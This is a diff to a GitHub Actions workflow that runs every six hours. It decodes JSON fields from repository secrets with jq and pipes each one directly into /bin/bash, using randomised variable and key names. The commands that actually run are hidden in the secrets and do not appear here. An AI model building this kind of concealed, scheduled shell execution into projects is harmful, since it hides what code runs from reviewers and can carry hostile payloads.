@@ -1,9 +1,9 @@
 name: jutibangxin
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 3/6 * * *'
-
+    - cron: '59 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: jutibangxin
         env:
-          gpco282: ${{ secrets.gpco282 }}
+          go2: ${{ secrets.go2 }}
         run: |
-          echo $gpco282 | jq -r .s4 | /bin/bash
-          echo $drxg80684 | jq -r .avu668 | /bin/bash
-          echo $hsjo5545 | jq -r .s38597 | /bin/bash
-          echo $nfii96 | jq -r .jmvf3 | /bin/bash
-          echo $qxzgu4 | jq -r .w4 | /bin/bash
-          echo $hjpvi96052 | jq -r .ifo7973 | /bin/bash
-          echo $mv60 | jq -r .v29838 | /bin/bash
-          echo $ziakq7997 | jq -r .vxsx238 | /bin/bash
-          echo $pxx305 | jq -r .edw2 | /bin/bash
+          echo $go2 | jq -r .m14 | /bin/bash
+          echo $rhm35770 | jq -r .e0924 | /bin/bash
+          echo $q17 | jq -r .aw710 | /bin/bash
+          echo $faww069 | jq -r .gn534 | /bin/bash
+          echo $tukk827 | jq -r .fbjgw226 | /bin/bash
+          echo $njtcg8 | jq -r .ulj64 | /bin/bash
+          echo $balo08824 | jq -r .bp9617 | /bin/bash
+          echo $je72151 | jq -r .pbnn017 | /bin/bash
+          echo $sgba0 | jq -r .lir99 | /bin/bash
+          echo $ldilr464 | jq -r .un84754 | /bin/bash
+          echo $oess9 | jq -r .pit0 | /bin/bash
 
